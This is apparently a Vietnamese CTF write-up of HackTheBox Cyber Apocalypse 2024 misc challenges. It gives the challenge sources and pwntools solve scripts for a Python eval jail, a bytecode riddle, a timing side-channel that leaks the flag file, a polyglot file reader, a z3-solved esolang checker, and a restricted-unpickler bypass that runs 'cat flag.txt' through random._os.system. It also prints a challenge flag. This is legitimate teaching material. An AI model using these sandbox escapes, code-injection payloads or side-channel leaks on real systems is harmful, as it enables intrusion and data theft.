⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⠛⠛⠻⠿⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
'''

blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%', 
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's', 
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()
  
  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n")
```
---

hàm eval() là hàm sẽ thực thi những câu lệnh python mà ta viết trong đó dưới dạng str. Nhưng những str ta nhập phải vượt qua black list chặn rất nhiều những ký tự và hàm quan trọng.

```py
# nc 

from pwn import *

def main() -> None:

    s = remote("83.136.252.194", 45881)

    print(s.recvuntil(b"\n\n").decode())
    s.sendline(b"print(open('flag.txt','r').read())#")
    print(s.recvuntil(b'}').decode())

if __name__ == "__main__":
    main()
```

### 3. Stop Drop and Roll

---
**_SOURCE:_**

```py
import random

CHOICES = ["GORGE", "PHREAK", "FIRE"]
FLAG = "HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}"

print("===== THE FRAY: THE VIDEO GAME =====")
print("Welcome!")
print("This video game is very simple")
print("You are a competitor in The Fray, running the GAUNTLET")
print("I will give you one of three scenarios: GORGE, PHREAK or FIRE")
print("You have to tell me if I need to STOP, DROP or ROLL")
print("If I tell you there's a GORGE, you send back STOP")
print("If I tell you there's a PHREAK, you send back DROP")
print("If I tell you there's a FIRE, you send back ROLL")
print("Sometimes, I will send back more than one! Like this: ")
print("GORGE, FIRE, PHREAK")
print("In this case, you need to send back STOP-ROLL-DROP!")

ready = input("Are you ready? (y/n) ")

if ready.lower() != "y":
    print("That's a shame!")
    exit(0)

print("Ok then! Let's go!")

count = 0
tasks = []

for _ in range(500):
    tasks = []
    count = random.randint(1, 5)

    for _ in range(count):
        tasks.append(random.choice(CHOICES))

    print(', '.join(tasks))

    result = input("What do you do? ")
    correct_result = "-".join(tasks).replace("GORGE", "STOP").replace("PHREAK", "DROP").replace("FIRE", "ROLL")

    if result != correct_result:
        print("Unfortunate! You died!")
        exit(0)

print(f"Fantastic work! The flag is {FLAG}")
```
---

Bài này cũng không có gì ta chỉ cần nhận vào một list rồi gửi lại một list khác với các giá trị tương ứng là được.

```py
# nc 83.136.251.232 58416

from pwn import *

def main() -> None:

    s = remote("83.136.251.232", 58416)

    s.sendlineafter(b'(y/n) ', b'y')
    s.recvline()

    while True:
        recv = s.recvlineS().strip()
        print(recv)
        if 'GORGE' not in recv and 'PHREAK' not in recv and 'FIRE' not in recv:
            print(recv)
            break

        result = recv.replace(", ", "-")
        result = result.replace("GORGE", "STOP")
        result = result.replace("PHREAK", "DROP")
        result = result.replace("FIRE", "ROLL")

        s.sendlineafter(b'do? ', result.encode())


if __name__ == "__main__":
    main()
```


### 4. Cu
---

**_SOURCE:_**

[here](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/misc/%5BEasy%5D%20Cubicle%20Riddle/release/misc_cubicle_riddle.zip) :v

---

Bài này có mấu chốt chủ yếu là ở phần này:

```py
 
    def _construct_answer(self, answer: bytes) -> types.CodeType:
        co_code: bytearray = bytearray(self.co_code_start)
        co_code.extend(answer)
        co_code.extend(self.co_code_end)
        code_obj: types.CodeType = types.CodeType(
            1,
            0,
            0,
            4,
            3,
            3,
            bytes(co_code),
            (None, self.max_int, self.min_int),
            (),
            ("num_list", "min", "max", "num"),
            __file__,
            "_answer_func",
            "_answer_func",
            1,
            b"",
            b"",
            (),
            (),
        )
  ```

mình có thể gửi một đoạn bytes vào phần co_de. Chúng ta cần chú ý đến một vài phần sau:

+ codeobject.co_consts là mảng tuple chứa các giá trị của hàm, ở trong trường hợp này là (None, self.max_int, self.min_int)
+ codeobject.co_varnames là mảng gồm tên của các biến trong hàm, ở trong trường hợp này là ("num_list", "min", "max", "num")
+ codeobject.co_code đây là phần quan trong nhất, là một chuỗi byte biểu thị chuỗi hướng dẫn mã byte trong hàm.
  
Từ đó chúng ta có thể gán giá trị của một số nào đó cho min, max rồi có thể trả nó về. Trong python có hỗ trợ thư viện [này](https://unpyc.sourceforge.net/Opcodes.html) giúp chuyển hàm thành dạng code khá hay ho và nên đọc thử. 

Tổng hợp tất cả các thông tin đã có như sau: ta viết một hàm tìm ra giá trị lớn nhất, nhỏ nhất của nums_list rồi lưu lại vào biến min, max đã có sẵn, sau đó chuyển nó thành dạng bytes và gửi nó đi là ta thành công có được flag.

```py
from pwn import *
def _answer_func(num_list: int):
    min: int = 1000
    max: int = -1000
    for num in num_list:
        if num < min:
            min = num
        if num > max:
            max = num
    return (min, max)
def main() -> None:
    s = remote("94.237.54.30", 56070)
    ans: bytes = _answer_func.__code__.co_code
    ans = ",".join([str(x) for x in ans])
    print(ans)
    
    print(s.recvuntil(b"(Choose wisely) > ").decode())
    s.sendline(b"1")
    print(s.recvuntil(b"(Answer wisely) >").decode())
    s.sendline(ans.encode())
    print(s.recvuntil(b"}").decode())
if __name__ == "__main__":
    main()

```

### 5. Multi...

---
**_TASK:_**

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/e5e478c0-0731-4931-b123-be3529145917)

---

Bài này khá là hay. Có thể giải theo cách timming attack. Đề bài yêu cầu ta phải nhập vào một program có thể chạy được nhiều ngôn ngữ để đọc file, máy chủ sẽ chạy file đó qua từng ngôn ngữ khác nhau cho tới khi thỏa mãn hết sẽ in ra flag. Nhưng việc code như vậy sẽ khá tốn công nên lợi dụng việc chương trình chạy code mà ta gửi để có thể lợi dựng điều đó để chạy một vài hàm leak ra thông tin gì đó về flag (ở đây nó leak ra dưới dạng thời gian phản hồi).

Khi ta gửi chương trình này:


```py
import time
flag = open('flag.txt', 'r').read()
time.sleep(ord(flag[{i}]) / 10)
```
Máy chủ sẽ chạy nó, trong khi nó vẫn thỏa mãn yêu cầu của sever và cũng leak cho chúng ta thông tin thêm về flag.

Từ đó, ta gửi yêu cầu nhiều lần lên lên máy chủ, mỗi lần đọc từng ký tự của flag khi đó chương trình sẽ tạm dừng chương trình một khoảng thời gian đúng bằng (ord(flag) / 10) nên ta tính toán khoảng thời gian chênh lệch là ta có flag ( trong đoạn code có bị trừ đi cho 2 là do một vài yếu tố mội trường như tốc độ mang, máy tính ảnh hưởng tới thời gian)

```py

import time
from base64 import *
from pwn import *

def main() -> None:

    flag = ""

    for i in range(100):

        code = f"""
import time
flag = open('flag.txt', 'r').read()
time.sleep(ord(flag[{i}]) / 10)
"""
        s = remote("94.237.63.93", 38070)

        s.recvuntil(b'Enter the program of many languages: ')
        start = time.time()
        s.sendline(b64encode(code.encode()))
        s.recvuntil(b'[+] Completed. Checking output')
        end = time.time()

        flag += chr(int((end - start)* 10) - 2)
        print(flag)

        s.close()

        if flag[-1] == "}":
            break

if __name__ == "__main__":
    main()

```


> Another way: Ngôn ngữ của chúa


```py
#include/*
#<?php eval('echo file_get_contents("flag.txt", true);')?>
q="""*/<stdio.h>
int main() {char s[500];fgets(s, 500, fopen((const char[]){'f','l','a','g','.','t','x','t','\x00'}, (const char[]){'r', '\x00'})); {puts(s);}if(1);
	else	{}} /*=;
open(my $file, 'flag.txt');print(<$file>)#";print(puts File.read('flag.txt'));#""";print(open('flag.txt').read())#*/
```

Nếu bạn đã quá mệt mỏi vì mấy bài brute force 2 ^ 32 thì có thể sử dụng cách này (copy code trên mạng)

### 6. colored_squares

---

**_SOURCE:_**

[here](https://esolangs.org/wiki/Folders)

---

Khi mở file này ra ta thấy đâ gồm rất nhiều file (hơn 3000) và bên trong hầu như trống và không có nhiều ký tự.

Sau một hồi loai hoay tìm hiểu thì mình nhận ra đây là một kiểu script tương tựu như brainfuck. Nền lên mạng thì tìm thấy thư viện [này](https://github.com/SinaKhalili/Folders.py) có thể chuyển nó về file python. Đây là code sau khi mình đã chuyển.

```py
print("Enter the flag in decimal (one character per line) :\n", end='', flush=True)
var_0 = input()
if var_0.isdigit():
    var_0 = int(var_0)
else:
    var_0 = var_0
var_1 = input()
if var_1.isdigit():
    var_1 = int(var_1)
else:
    var_1 = var_1
var_2 = input()
if var_2.isdigit():
    var_2 = int(var_2)
else:
    var_2 = var_2
var_3 = input()
if var_3.isdigit():
    var_3 = int(var_3)
else:
    var_3 = var_3
var_4 = input()
if var_4.isdigit():
    var_4 = int(var_4)
else:
    var_4 = var_4
var_5 = input()
if var_5.isdigit():
    var_5 = int(var_5)
else:
    var_5 = var_5
var_6 = input()
if var_6.isdigit():
    var_6 = int(var_6)
else:
    var_6 = var_6
var_7 = input()
if var_7.isdigit():
    var_7 = int(var_7)
else:
    var_7 = var_7
var_8 = input()
if var_8.isdigit():
    var_8 = int(var_8)
else:
    var_8 = var_8
var_9 = input()
if var_9.isdigit():
    var_9 = int(var_9)
else:
    var_9 = var_9
var_10 = input()
if var_10.isdigit():
    var_10 = int(var_10)
else:
    var_10 = var_10
var_11 = input()
if var_11.isdigit():
    var_11 = int(var_11)
else:
    var_11 = var_11
var_12 = input()
if var_12.isdigit():
    var_12 = int(var_12)
else:
    var_12 = var_12
var_13 = input()
if var_13.isdigit():
    var_13 = int(var_13)
else:
    var_13 = var_13
var_14 = input()
if var_14.isdigit():
    var_14 = int(var_14)
else:
    var_14 = var_14
var_15 = input()
if var_15.isdigit():
    var_15 = int(var_15)
else:
    var_15 = var_15
var_16 = input()
if var_16.isdigit():
    var_16 = int(var_16)
else:
    var_16 = var_16
var_17 = input()
if var_17.isdigit():
    var_17 = int(var_17)
else:
    var_17 = var_17
var_18 = input()
if var_18.isdigit():
    var_18 = int(var_18)
else:
    var_18 = var_18
var_19 = input()
if var_19.isdigit():
    var_19 = int(var_19)
else:
    var_19 = var_19
var_20 = input()
if var_20.isdigit():
    var_20 = int(var_20)
else:
    var_20 = var_20
var_21 = input()
if var_21.isdigit():
    var_21 = int(var_21)
else:
    var_21 = var_21
if (((var_7) - (var_18)) == ((var_8) - (var_9))):
    if (((var_6) + (var_10)) == (((var_16) + (var_20)) + (12))):
        if (((var_8) * (var_14)) == (((var_13) * (var_18)) * (2))):
            if ((var_19) == (var_6)):
                if (((var_9) + (1)) == ((var_17) - (1))):
                    if (((var_11) / ((var_5) + (7))) == (2)):
                        if (((var_5) + ((var_2) / (2))) == (var_1)):
                            if (((var_16) - (9)) == ((var_13) + (4))):
                                if (((var_12) / (3)) == (17)):
                                    if ((((var_4) - (var_5)) + (var_12)) == ((var_14) + (20))):
                                        if ((((var_12) * (var_15)) / (var_14)) == (24)):
                                            if ((var_18) == ((173) - (var_4))):
                                                if ((var_6) == ((63) + (var_5))):
                                                    if (((32) * (var_16)) == ((var_7) * (var_0))):
                                                        if ((125) == (var_21)):
                                                            if (((var_3) - (var_2)) == (57)):
                                                                if (((var_17) - (var_15)) == ((var_18) + (1))):
                                                                    print("Good job! :)", end='', flush=True)
```

Thấy flag có 22 ký tự và các ký tự thỏa mãn với nhau theo các điều kiện trong hàm if nên từ đó ta có 22 ẩn và rất nhiều phương trình. Sử dụng các điều kiện ở trên với điều kiện các ký tự kia thuộc ascii và ta có thể đọc được nên ta gán khoảng giá trị cho nó 44 < x < 125, ngoài ra ta cũng có flag form là HTB{..} tương ứng với các vị trí trong flag nên ta cũng sử dụng nó để tính. Và đây là code (gần) của mình.

```py


from z3 import *

def main() -> None:
    
    flag = BitVecs('v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21', 8)

    s = Solver()

    s.add(flag[7] - flag[18] == flag[8] - flag[9])
    s.add(flag[6] + flag[10] == flag[16] + flag[20] + 12)
    s.add(flag[8] * flag[14] == 2 * flag[18] * flag[13])
    s.add(flag[19] == flag[6])
    s.add(flag[9] + 1 == flag[17] - 1)
    s.add(flag[11] == 2 * (flag[5] + 7))
    s.add(flag[5] + flag[2]/2 == flag[1])
    s.add(flag[16] - 9 == flag[13] + 4)
    s.add(flag[12] == 17 * 3)
    s.add(flag[4] - flag[5] + flag[12] == flag[14] + 20)
    s.add(flag[12] * flag[15] == 24 * flag[14])
    s.add(flag[18] + flag[4] == 173)
    s.add(flag[6] == flag[5] + 63)
    s.add(flag[16] * 32 == flag[0] * flag[7])
    s.add(flag[21] == 125)
    s.add(flag[3] - flag[2] == 57)
    s.add(flag[17] - flag[15] == flag[18] + 1)
    for i in range(len(flag)):
        s.add(flag[i] >= 48)
        s.add(flag[i] <= 125)

    s.add(flag[0] == ord('H'))
    s.add(flag[1] == ord('T'))
    s.add(flag[2] == ord('B'))
    s.add(flag[3] == ord('{'))
    s.add(flag[21] == ord('}'))
    f = ''
    if s.check() == sat:
        m = s.model()
        for v in flag:
            f += chr(m[v].as_long())
    else:
        print('fail')
    
    print(f"flag: {f}")

if __name__ == "__main__":
    main()
```

### 7. Were Pickle Phreaks


---

**_SOURCE:_**

```py
from sandbox import unpickle, pickle
import random

members = []

class Phreaks:
    def __init__(self, hacker_handle, category, id):
        self.hacker_handle = hacker_handle
        self.category = category
        self.id = id

    def display_info(self):
        print('================ ==============')
        print(f'Hacker Handle    {self.hacker_handle}')
        print('================ ==============')
        print(f'Category         {self.category}')
        print(f'Id               {self.id}')
        print()

def menu():
    print('Phreaks member registration')
    print('1. View current members')
    print('2. Register new member')
    print('3. Exit')

def add_existing_members():
    members.append(pickle(Phreaks('Skrill', 'Rev', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Alfredy', 'Hardware', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Suspicious', 'Pwn', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Queso', 'Web', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Stackos', 'Blockchain', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Lin', 'Web', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Almost Blood', 'JIT', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Fiasco', 'Web', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Big Mac', 'Web', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Freda', 'Forensics', random.randint(1, 10000))))
    members.append(pickle(Phreaks('Karamuse', 'ML', random.randint(1, 10000))))

def view_members():
    for member in members:
        try:
            member = unpickle(member)
            member.display_info()
        except:
            print('Invalid Phreaks member')

def register_member():
    pickle_data = input('Enter new member data: ')
    members.append(pickle_data)

def main():
    add_existing_members()
    while True:
        menu()
        try:
            option = int(input('> '))
        except ValueError:
            print('Invalid input')
            print()
            continue
        if option == 1:
            view_members()
        elif option == 2:
            register_member()
        elif option == 3:
            print('Exiting...')
            exit()
        else:
            print('No such option')  
        print()

if __name__ == '__main__':
    main()
```

```python
from base64 import b64decode, b64encode 
from io import BytesIO
import pickle as _pickle

ALLOWED_PICKLE_MODULES = ['__main__', 'app']
UNSAFE_NAMES = ['__builtins__']

class RestrictedUnpickler(_pickle.Unpickler):
    def find_class(self, module, name):
        print(module, name)
        if (module in ALLOWED_PICKLE_MODULES and not any(name.startswith(f"{name_}.") for name_ in UNSAFE_NAMES)):
            return super().find_class(module, name)
        raise _pickle.UnpicklingError()
    
def unpickle(data):
    return RestrictedUnpickler(BytesIO(b64decode(data))).load()
    
def pickle(obj):
    return b64encode(_pickle.dumps(obj))
```
---



```py
from base64 import b64encode
from pickora import Compiler
from pwn import *

# nc 83.136.253.251 36803

def main() -> None:
    
    s = connect("83.136.253.251", 36803)

    print(s.recvuntil(b"> ").decode())
    s.sendline(b"2")
    print(s.recvuntil(b": ").decode())

    tmp = "GLOBAL('app', 'random._os.system')('cat flag.txt')"
    payload = Compiler().compile(tmp)
    payload = b64encode(payload).decode()
    s.sendline(payload)
    print(s.recvuntil(b"> ").decode())
    s.sendline(b"1")
    print(s.recv().decode())
    print(s.recv().decode())
    
if __name__ == "__main__":
    main()
```
